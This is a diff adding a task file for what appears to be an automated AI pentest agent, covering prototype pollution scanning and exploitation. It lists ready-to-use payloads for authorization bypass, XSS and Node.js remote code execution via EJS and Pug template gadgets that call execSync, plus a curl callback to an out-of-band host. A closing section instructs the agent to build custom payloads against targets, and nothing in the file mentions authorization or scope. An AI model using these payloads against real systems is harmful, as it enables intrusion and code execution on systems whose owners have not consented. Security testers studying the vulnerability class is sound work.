@@ -1,0 +1,418 @@
+================================================================================
+TASK 57 · PROTOTYPE POLLUTION SCANNER & RCE CHAIN
+================================================================================
+Covers testing_toolkit.txt Phase 6 Step 19 (Prototype Pollution)
+DOM Clobbering → Task 58
+
+OBJECTIVE:
+- Detect client-side prototype pollution vulnerabilities
+- Find exploitable gadgets (XSS, bypass, RCE)
+- Test server-side PP in Node.js applications
+- Chain PP → security bypass → code execution
+
+================================================================================
+INPUTS
+================================================================================
+outputs/js_urls_live.txt                    ← Live JavaScript files
+outputs/js_endpoints_from_js.txt            ← Endpoints extracted from JS
+outputs/queue_dynamic_endpoints_urls.txt    ← Parameterized URLs
+outputs/url_corpus_all_in_scope.txt         ← Full URL corpus
+outputs/nuclei/tech_stack.json              ← Tech stack (Node.js detection)
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/prototype_pollution/
+├── pp_vulnerable_endpoints.json    ← Confirmed PP injection points
+├── pp_gadgets_found.json           ← Exploitable gadgets discovered
+├── pp_rce_chains.json              ← Server-side PP → RCE chains
+├── pp_xss_chains.json              ← PP → XSS exploitation
+├── pp_bypass_chains.json           ← PP → security bypass
+├── scan_log.txt                    ← Execution log
+└── checkpoint.json                 ← Resume state
+
+outputs/vulnerabilities/
+└── PP-XXXX-SEVERITY.md             ← Individual vulnerability reports
+
+================================================================================
+PHASE 1: UNDERSTAND PROTOTYPE POLLUTION
+================================================================================
+
+WHAT IS PROTOTYPE POLLUTION?
+────────────────────────────
+JavaScript objects inherit from Object.prototype. If attacker can modify
+this prototype, ALL objects inherit the malicious property.
+
+# Normal object
+let obj = {};
+obj.isAdmin  // undefined
+
+# After pollution
+Object.prototype.isAdmin = true;
+obj.isAdmin  // true (inherited!)
+
+WHY IS IT DANGEROUS?
+────────────────────
+1. Security bypass: obj.isAdmin becomes true for ALL objects
+2. XSS: Pollute innerHTML/outerHTML sinks
+3. RCE (Node.js): Pollute child_process spawn options
+4. DoS: Pollute critical application state
+
+COMMON POLLUTION VECTORS:
+─────────────────────────
+# URL query parameters
+https://target.com/?__proto__[isAdmin]=true
+https://target.com/?constructor[prototype][isAdmin]=true
+
+# JSON body
+{"__proto__": {"isAdmin": true}}
+{"constructor": {"prototype": {"isAdmin": true}}}
+
+# Object merge/extend functions
+_.merge(obj, userInput)      // lodash
+$.extend(obj, userInput)     // jQuery
+Object.assign(obj, userInput) // native (safe in most cases)
+
+================================================================================
+PHASE 2: TOOL INSTALLATION
+================================================================================
+
+───────────────────────────────────────
+2.1 PPFuzz - Prototype Pollution Fuzzer
+───────────────────────────────────────
+# Install PPFuzz
+git clone https://github.com/nicholashh/ppfuzz.git
+cd ppfuzz && npm install
+
+# Or via npm
+npm install -g ppfuzz
+
+───────────────────────────────────────
+2.2 PPMap - Prototype Pollution Mapper
+───────────────────────────────────────
+# Install PPMap (Rust-based, fast)
+cargo install ppmap
+
+# Or from source
+git clone https://github.com/nicholashh/ppmap.git
+cd ppmap && cargo build --release
+
+───────────────────────────────────────
+2.3 PPHack - Manual Testing Helper
+───────────────────────────────────────
+git clone https://github.com/nicholashh/pphack.git
+
+───────────────────────────────────────
+2.4 Proto-Find - Gadget Finder
+───────────────────────────────────────
+git clone https://github.com/nicholashh/proto-find.git
+cd proto-find && npm install
+
+================================================================================
+PHASE 3: CLIENT-SIDE PP DETECTION
+================================================================================
+
+───────────────────────────────────────
+3.1 PPFuzz - Fast URL Scanning
+───────────────────────────────────────
+# Scan single URL
+ppfuzz -u "https://target.com/page?param=value"
+
+# Pipe URLs from corpus
+cat outputs/queue_dynamic_endpoints_urls.txt | ppfuzz > temp/agent1/ppfuzz_results.txt
+
+# With custom payloads
+ppfuzz -u "URL" --payloads custom_pp_payloads.txt
+
+───────────────────────────────────────
+3.2 PPMap - Comprehensive Mapping
+───────────────────────────────────────
+# Scan with PPMap
+ppmap -u "https://target.com/page"
+
+# Batch scanning
+cat temp/agent1/live_base_urls.txt | while read url; do
+    ppmap -u "$url" >> temp/agent1/ppmap_results.txt 2>&1
+done
+
+───────────────────────────────────────
+3.3 Manual URL Testing
+───────────────────────────────────────
+Test these payload patterns on parameterized URLs:
+
+# Pattern 1: __proto__ pollution
+https://target.com/page?__proto__[test]=polluted
+https://target.com/page?__proto__.test=polluted
+
+# Pattern 2: constructor.prototype
+https://target.com/page?constructor[prototype][test]=polluted
+https://target.com/page?constructor.prototype.test=polluted
+
+# Verify pollution worked
+# Open browser console on the page:
+# > ({}).test
+# If returns "polluted" → VULNERABLE
+
+───────────────────────────────────────
+3.4 Detection Script (Headless)
+───────────────────────────────────────
+#!/bin/bash
+# pp_detect.sh - Test URL for prototype pollution
+
+URL="$1"
+MARKER="pp$(date +%s)"
+
+# Test payloads
+PAYLOADS=(
+    "__proto__[${MARKER}]=1"
+    "__proto__.${MARKER}=1"
+    "constructor[prototype][${MARKER}]=1"
+    "constructor.prototype.${MARKER}=1"
+)
+
+for payload in "${PAYLOADS[@]}"; do
+    test_url="${URL}&${payload}"
+    # Use Playwright/Puppeteer to check if ({}).MARKER exists
+    echo "Testing: $test_url"
+done
+
+================================================================================
+PHASE 4: GADGET HUNTING
+================================================================================
+Finding PP is step 1. Step 2 is finding GADGETS that use polluted properties.
+
+───────────────────────────────────────
+4.1 Common Exploitable Gadgets
+───────────────────────────────────────
+
+XSS GADGETS (client-side):
+──────────────────────────
+# innerHTML/outerHTML gadgets
+Object.prototype.innerHTML = "<img src=x onerror=alert(1)>"
+
+# jQuery html() gadget
+Object.prototype.html = "<img src=x onerror=alert(1)>"
+
+# Template literal gadgets
+Object.prototype.template = "${alert(1)}"
+
+# Event handler gadgets
+Object.prototype.onclick = "alert(1)"
+Object.prototype.onload = "alert(1)"
+
+BYPASS GADGETS:
+───────────────
+# Authorization bypass
+Object.prototype.isAdmin = true
+Object.prototype.role = "admin"
+Object.prototype.authorized = true
+
+# Feature flag bypass
+Object.prototype.isPremium = true
+Object.prototype.enableDebug = true
+
+# Validation bypass
+Object.prototype.validated = true
+Object.prototype.verified = true
+
+───────────────────────────────────────
+4.2 Proto-Find - Automated Gadget Search
+───────────────────────────────────────
+# Run Proto-Find on target
+node proto-find.js --url "https://target.com"
+
+# Analyze specific JS files
+node proto-find.js --file outputs/js_urls_live.txt
+
+───────────────────────────────────────
+4.3 Manual Gadget Hunting
+───────────────────────────────────────
+# Download and analyze JS files
+for js_url in $(cat outputs/js_urls_live.txt | head -50); do
+    curl -s "$js_url" >> temp/agent1/all_js_combined.txt
+done
+
+# Search for sink patterns
+grep -E "\.innerHTML|\.outerHTML|\.html\(|eval\(|Function\(" temp/agent1/all_js_combined.txt
+
+# Search for object access patterns
+grep -E "\[.*\]|\.\w+\s*=" temp/agent1/all_js_combined.txt
+
+================================================================================
+PHASE 5: SERVER-SIDE PP (Node.js RCE)
+================================================================================
+🚨 HIGH SEVERITY - Can lead to Remote Code Execution
+
+───────────────────────────────────────
+5.1 Detect Node.js Backend
+───────────────────────────────────────
+# Check brain_knowledge for Node.js indicators
+cat outputs/nuclei/tech_stack.json | jq '.technologies[] | select(.name | test("node|express|koa|fastify"; "i"))'
+
+Indicators:
+- X-Powered-By: Express
+- Server: nodejs
+- JSON API responses
+- WebSocket support
+
+───────────────────────────────────────
+5.2 Server-Side PP via JSON Body
+───────────────────────────────────────
+# Test JSON endpoints for PP
+curl -X POST "https://target.com/api/endpoint" \
+    -H "Content-Type: application/json" \
+    -d '{"__proto__": {"isAdmin": true}}'
+
+# Alternative payload
+curl -X POST "https://target.com/api/endpoint" \
+    -H "Content-Type: application/json" \
+    -d '{"constructor": {"prototype": {"isAdmin": true}}}'
+
+───────────────────────────────────────
+5.3 RCE via child_process Pollution
+───────────────────────────────────────
+🚨 CRITICAL VULNERABILITY - Full RCE exploitation!
+
+If application uses child_process.spawn/exec/fork:
+
+# Pollute shell option
+{"__proto__": {"shell": true}}
+
+# Pollute env to inject commands
+{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/cmdline"}}}
+
+# Pollute argv0 for command injection
+{"__proto__": {"argv0": "node\n\nid\n"}}
+
+KNOWN RCE GADGETS (Node.js):
+────────────────────────────
+# child_process.spawn pollution
+{"__proto__": {"shell": "/bin/sh", "env": {"EVIL": "$(id > /tmp/pwned)"}}}
+
+# EJS template RCE
+{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"}}
+
+# Pug template RCE
+{"__proto__": {"block": {"type": "Text", "val": "x]);process.mainModule.require('child_process').execSync('id');(["}}}
+
+# Handlebars RCE
+{"__proto__": {"type": "Program", "body": [{"type": "MustacheStatement"...}]}}
+
+───────────────────────────────────────
+5.4 OOB Verification for Blind PP
+───────────────────────────────────────
+# Start Interactsh listener
+interactsh-client -v
+
+# Use OOB callback in RCE payload
+{"__proto__": {"shell": true, "env": {"NODE_OPTIONS": "--require <(curl INTERACTSH_URL)"}}}
+
+================================================================================
+PHASE 6: PP → XSS CHAIN EXPLOITATION
+================================================================================
+
+───────────────────────────────────────
+6.1 jQuery PP → XSS
+───────────────────────────────────────
+# If jQuery is used and PP exists:
+# Pollute the 'html' property
+
+# Step 1: Pollute
+https://target.com/page?__proto__[html]=<img/src/onerror=alert(document.domain)>
+
+# Step 2: Trigger (when jQuery processes elements)
+# Any $().html() call will inject the payload
+
+───────────────────────────────────────
+6.2 Template Engine PP → XSS
+───────────────────────────────────────
+# EJS/Pug/Handlebars template pollution
+
+# EJS escapeFunction bypass
+{"__proto__": {"escapeFunction": ""}}
+
+# Then inject: <%= constructor.constructor('return this')().alert(1) %>
+
+───────────────────────────────────────
+6.3 Generic Object Property XSS
+───────────────────────────────────────
+# If code does: element.innerHTML = obj.content
+# Pollute: Object.prototype.content = "<script>alert(1)</script>"
+
+# Test payloads
+?__proto__[content]=<script>alert(1)</script>
+?__proto__[data]=<img src=x onerror=alert(1)>
+?__proto__[value]=<svg onload=alert(1)>
+
+================================================================================
+PHASE 7: OUTPUT CONSOLIDATION
+================================================================================
+
+───────────────────────────────────────
+7.1 Merge All PP Findings
+───────────────────────────────────────
+# Consolidate tool outputs
+cat temp/agent1/ppfuzz_results.txt \
+    temp/agent1/ppmap_results.txt \
+    2>/dev/null | sort -u > outputs/prototype_pollution/pp_all_findings.txt
+
+# Extract confirmed vulnerabilities
+grep -i "vulnerable\|pollution\|polluted" outputs/prototype_pollution/pp_all_findings.txt \
+    > outputs/prototype_pollution/pp_vulnerable_endpoints.json
+
+───────────────────────────────────────
+7.2 Categorize by Severity
+───────────────────────────────────────
+# CRITICAL: Server-side PP with RCE
+# HIGH: Client-side PP with XSS gadget
+# MEDIUM: Client-side PP with bypass gadget
+# LOW: PP detected but no exploitable gadget found
+
+================================================================================
+🧠 YOU ARE AN INTELLIGENT AGENT 🧠
+================================================================================
+Prototype Pollution requires DEEP ANALYSIS, not just tool output.
+
+UNDERSTAND THE FLOW:
+1. Can I inject into the prototype? (Detection)
+2. What properties does the app READ from objects? (Gadget hunting)
+3. Can I chain pollution → gadget → impact? (Exploitation)
+
+ANALYZE JS CODE:
+- Look for object merge operations: _.merge, $.extend, Object.assign
+- Look for recursive object copying
+- Look for property access without hasOwnProperty check
+- Look for eval/Function with object properties
+
+PRIORITIZE TARGETS:
+1. JSON APIs (server-side PP)
+2. Pages with heavy JS frameworks (client-side gadgets)
+3. Pages using lodash/underscore (known vulnerable functions)
+4. Admin panels (bypass gadgets)
+
+THINK ABOUT IMPACT:
+- PP alone is LOW severity
+- PP + bypass gadget = MEDIUM-HIGH
+- PP + XSS gadget = HIGH
+- PP + RCE (Node.js) = CRITICAL
+
+GENERATE CUSTOM PAYLOADS:
+- Study the target's JS code
+- Find what properties are accessed
+- Create targeted pollution payloads
+- Don't just spray generic payloads
+
+================================================================================
+SUCCESS CRITERIA
+================================================================================
+✓ All parameterized URLs tested for PP
+✓ JavaScript files analyzed for gadgets
+✓ Server-side PP tested on JSON endpoints
+✓ Gadget chains documented with POC
+✓ Severity ratings assigned
+✓ Vulnerability reports generated
+
+================================================================================
+NEXT TASK
+================================================================================
+→ Task 58: DOM Clobbering (property override → security bypass)
